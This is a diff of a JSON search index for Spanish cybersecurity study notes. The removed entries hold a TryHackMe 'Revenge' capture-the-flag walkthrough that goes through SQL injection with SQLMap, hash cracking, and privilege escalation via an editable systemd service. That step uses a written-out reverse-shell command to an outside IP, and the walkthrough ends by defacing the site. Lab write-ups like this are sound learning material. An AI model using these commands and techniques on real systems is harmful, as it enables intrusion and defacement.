@@ -1,42 +1,42 @@
 [
   {
-    "title": "0. Linux Fundamentals 2",
-    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/2-linux-fundamentals/2-linux-fundamentals-2/0-linux-fundamentals-2/",
-    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/2. Linux Fundamentals 2/0. Linux Fundamentals 2.md",
-    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 2. Linux Fundamentals > 2. Linux Fundamentals 2",
-    "content": "[[THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/0. Linux Fundamentals 2]]\n[[THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/2. Linux Fundamentals 2/1. Redireccion]]",
-    "modified": "2025-11-21T00:49:26"
+    "title": "0. Pre Career",
+    "path": "/apuntes/ciberseguridad/thm/0-pre-career/0-pre-career/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/0. Pre Career/0. Pre Career.md",
+    "breadcrumb": "Ciberseguridad > THM > 0. Pre Career",
+    "content": "[[1. Pre Security]]\n[[2. Cyber Security 101]]",
+    "modified": "2025-11-22T00:47:14"
   },
   {
-    "title": "3. Finding the flags",
-    "path": "/apuntes/thm/maquinas/2-medium/3-revenge/3-finding-the-flags/",
-    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/3. Revenge/3. Finding the flags.md",
-    "breadcrumb": "THM > Maquinas > 2. Medium > 3. Revenge",
-    "content": "1. Vamos a la página que nos dan.\n   ![[Pasted image 20251120201019.png]]\n   Una vez allí investigamos las páginas y encontramos algunas:\n\t- Home\n\t- Products\n\t- Contact\n\t- Login\n2. Pero como somos gente curiosa no nos quedamos ahí y vamos a hacer un escaneo más profundo con nuestra herramienta de elección. En mi caso voy a usar `gobuster`.\n   ![[Pasted image 20251120203103.png]]\n   Hemos encontrado dos directorios que no aparecían directamente en la web, aunque el directorio `/static` parece estas en estado `403 Forbbiden`.\n3. Comprobamos lo que hay en `/admin`.\n   ![[Pasted image 20251120223956.png]]\n   Parece que hemos encontrado el login del administrador, pero no tenemos credenciales (todavía).\n4. Vamos a hacer un nmap, no sea que estemos pasando algo por alto.\n   ![[Pasted image 20251120231017.png]]\n   Parece que está abierto el puerto SSH, hmmm...\n5. Volvamos a investigar el resto de las páginas. No vemos nada interesante (más allá de la página de login normal, pero nosotros ya tenemos la del admin) hasta que llegamos a la página `/products`.\n   ![[Pasted image 20251120224808.png]]\n6. Si hacemos click en alguno de los productos, vemos que en la URL aparece un número (que pareciera ser el ID del producto en cuestión).\n   ![[Pasted image 20251120224916.png]]\n7. Si probamos a cambiar ese número por uno que no exista, como `0`, vemos que el servidor no responde con un `404 Not Found`, sino con un `500 Internal Server Error`, por lo que sabemos que esos números no son páginas html sino en efecto IDs que se están comprobando en una base de datos.\n   ![[Pasted image 20251120225058.png]]\n8. Vamos a probar la herramienta `SQLMap` con esta URL.\n   ![[Pasted image 20251120225313.png]]\n9. Después de esperar un poco, obtenemos las bases de datos:\n   ![[Pasted image 20251120225351.png]]\n10. Ahora sólo queda ir abriéndonos paso hasta dar con las credenciales de un administrador.\n\t1. Primero sacamos las tablas.\n\t   ![[Pasted image 20251120225513.png]]\n\t2. Luego dumpeamos la tabla que nos interesa (en nuestro caso los usuarios más interesantes estarán en `system_user`).\n\t   ![[Pasted image 20251120225641.png]]\n\t   ¡Vaya! Parece que están hasheadas. Bueno, eso no va a ser un impedimento para nosotros.\n11. Antes de continuar vamos a ver que hay en la tabla users también.\n    ![[Pasted image 20251120231302.png]]\n    Vaya vaya, parece que aquí tenemos nuestra **primera flag**.\n12. Cogemos la contraseña hasheada del administrador. Por el comienzo sabemos que es un bcrypt. Vamos a descifrarla.\n\t1. Buscamos el tipo de hash. Y metemos el nuestro en un archivo.\n\t   ![[Pasted image 20251120230437.png]]\n\t2. Lo deshasheamos con la herramienta `hashcat`.\n\t   ![[Pasted image 20251120230358.png]]\n13. Vamos a loguearnos. Pero lo vamos a hacer por SSH en el servidor, ya que no tiene mucho sentido hacerlo en la página, cuando lo que queremos es hacerle un deface a la página.\n    ![[Pasted image 20251120231510.png]]\n    Estamos dentro, veamos qué hay por aquí.\n14. Hacemos un `ls` y ¡sorpresa!\n    ![[Pasted image 20251120231559.png]]\n15. Sólo nos queda hacer el deface. Pero antes vamos a mirar que hay en `/root`, ¿no? Por curiosidad.\n    ![[Pasted image 20251120231735.png]]\n    Vaya, parece que nos hemos encontrado un problema, tendremos que escalar privilegios.\n16. Veamos qué comandos podemos ejecutar: con `sudo -l`.\n    ![[Pasted image 20251120231903.png]]\n    Parece que podemos jugar con un permiso como root... ¡y encima podemos editarlo! Ya está, el cóctel perfecto.\n17. Vamos a editar dicho servicio. Como sabemos que lo ejecuta el sistema (es decir que tiene permisos de administrador) vamos a intentar mandarnos una reverse shell.\n\t1. Vamos a la página de [Shell Generator](www.revshells.com) y buscamos una que nos guste.\n\t   ![[Pasted image 20251120232159.png]]\n\t2. Nos ponemos en escucha.\n\t   ![[Pasted image 20251120232228.png]]\n\t3. Editamos el servicio para que ejecute el siguiente comando: `sh -i >& /dev/tcp/192.168.129.186/9000 0>&1`, el cual nos mandará una reverse shell.\n\t   ![[Pasted image 20251120232512.png]]\n\t   ![[Pasted image 20251120232530.png]]\n\t4. Debemos editar el ExecStart y el usuario que lo ejecuta.\n\t   ![[Pasted image 20251120233209.png]]\n18. Hacemos un reload del daemon seguido de un restart del servicio, que eran dos comandos a los que también teníamos acceso.\n    ![[Pasted image 20251120233100.png]]\n19. Y tal cual acabamos de conseguir ser root.\n    ![[Pasted image 20251120233304.png]]\n20. Ahora sí vamos a mirar qué hay en `/root` seguro que está la flag.\n    ![[Pasted image 20251120233351.png]]\n    Pues no xD\n21. Bueno, vamos a hacer lo que nos pedía el reto, hacerle un defacement a la página principal.\n    ![[Pasted image 20251120233541.png]]\n    Como estoy de mal humor porque no he visto la flag todavia mando la página principal a la mierda >:(\n22. A ver si ahora ya está la flag por algún sitio.\n    ![[Pasted image 20251120233823.png]]\n\n\n>[!SUCCESS] UEEEEE! Hemos encontrado las 3 flags. \n\npwned by xut",
-    "modified": "2025-11-21T00:49:26"
+    "title": "0. Maquinas",
+    "path": "/apuntes/ciberseguridad/thm/maquinas/0-maquinas/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/Maquinas/0. Maquinas.md",
+    "breadcrumb": "Ciberseguridad > THM > Maquinas",
+    "content": "- [[1. Easy]]\n- [[2. Medium]]\n- [[3. Hard]]\n- [[4. Insane]]",
+    "modified": "2025-11-22T00:47:14"
   },
   {
-    "title": "0. Revenge",
-    "path": "/apuntes/thm/maquinas/2-medium/3-revenge/0-revenge/",
-    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/3. Revenge/0. Revenge.md",
-    "breadcrumb": "THM > Maquinas > 2. Medium > 3. Revenge",
-    "content": "[[1. Message from Billy Joel]]\n[[2. Revengeee]]\n[[3. Finding the flags]]",
-    "modified": "2025-11-21T00:49:26"
+    "title": "1. Career",
+    "path": "/apuntes/ciberseguridad/thm/1-career/1-career/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/1. Career.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career",
+    "content": "[[1. Security Analyst]]\n[[2. Penetration Tester]]\n[[3. Security Engineer]]",
+    "modified": "2025-11-22T00:47:14"
   },
   {
-    "title": "1. Message from Billy Joel",
-    "path": "/apuntes/thm/maquinas/2-medium/3-revenge/1-message-from-billy-joel/",
-    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/3. Revenge/1. Message from Billy Joel.md",
-    "breadcrumb": "THM > Maquinas > 2. Medium > 3. Revenge",
-    "content": "![[Pasted image 20251120195456.png]]\n\nBilly Joel te ha mandado un mensaje en relación a tu misión.\n\n![[Pasted image 20251120195524.png]]\n\n```txt\nTo whom it may concern,\n\nI know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy \nand left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.  \nI've done some initial enumeration of the site because I know *some* things about hacking but not enough.  \nFor that reason, I'll let you do your own enumeration and checking.\n\nWhat I want you to do is simple.  Break into the server that's running the website and deface the front page.  \nI don't care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don't want to cause irreparable damage.\n\nWhen you finish the job, you'll get the rest of your payment.  We agreed upon $5,000.  \nHalf up-front and half when you finish.\n\nGood luck,\n\nBilly\n```\n\nLa traducción:\n\n```txt\nA quien corresponda:\n\nSé que fuiste tú quien hackeó mi blog. Me impresionaron mucho tus habilidades. Fuiste un poco descuidado,\n\ny dejaste algunas huellas, así que pude rastrearte. Pero gracias por aceptar mi oferta.\n\nHe realizado una evaluación inicial del sitio porque sé algunas cosas sobre hacking, pero no lo suficiente.\n\nPor eso, te dejo que hagas tu propia evaluación y comprobación.\n\nLo que quiero que hagas es simple: accede al servidor que aloja el sitio web y modifica la página principal.\n\nNo me importa cómo lo hagas, solo hazlo. Pero recuerda: ¡NO DEJES EL SITIO FUERA DE SERVICIO! No queremos causar daños irreparables.\n\nCuando termines el trabajo, recibirás el resto del pago. Acordamos $5,000.\n\nLa mitad por adelantado y la otra mitad al terminar.\n\nBuena suerte,\n\nBilly\n```",
-    "modified": "2025-11-21T00:49:26"
+    "title": "1. Pre Security",
+    "path": "/apuntes/ciberseguridad/thm/0-pre-career/1-pre-security/1-pre-security/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Pre Security.md",
+    "breadcrumb": "Ciberseguridad > THM > 0. Pre Career > 1. Pre Security",
+    "content": "[[1. Introduction to cybersecurity]]\n[[2. Network Fundamentals]]\n[[3. How the Web Works]]\n[[4. Linux Fundamentals]]\n[[5. Windows Fundamentals]]",
+    "modified": "2025-11-22T00:47:14"
   },
   {
-    "title": "2. Revengeee",
-    "path": "/apuntes/thm/maquinas/2-medium/3-revenge/2-revengeee/",
-    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/3. Revenge/2. Revengeee.md",
-    "breadcrumb": "THM > Maquinas > 2. Medium > 3. Revenge",
-    "content": "![[Pasted image 20251120195708.png]]\n\n¡Esta es la venganza! Billy Joel te ha contratado para introducirte y defacear (modificar la página principal) la página de **Rubber Ducky Inc.**. Él fue despedido, probablemente por buenos motivos pero a quién le importa, tú estás aquí por la pasta. ¿Puedes completar tu parte del trato?",
-    "modified": "2025-11-21T00:49:26"
+    "title": "2. Cyber Security 101",
+    "path": "/apuntes/ciberseguridad/thm/0-pre-career/2-cyber-security-101/2-cyber-security-101/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Cyber Security 101.md",
+    "breadcrumb": "Ciberseguridad > THM > 0. Pre Career > 2. Cyber Security 101",
+    "content": "[[1. Start Your Cyber Security Journey]]\n[[2. Linux Fundamentals]]\n[[3. Windows and AD Fundamentals]]\n[[4. Command Line]]\n[[5. Networking]]\n[[6. Cryptography]]\n[[7. Exploitation Basics]]\n[[8. Web Hacking]]\n[[9. Offensive Security Tooling]]\n[[10. Defensive Security]]\n[[11. Security Solutions]]\n[[12. Defensive Security Tooling]]\n[[13. Build Your Cyber Security Career]]",
+    "modified": "2025-11-22T00:47:14"
   }
 ]
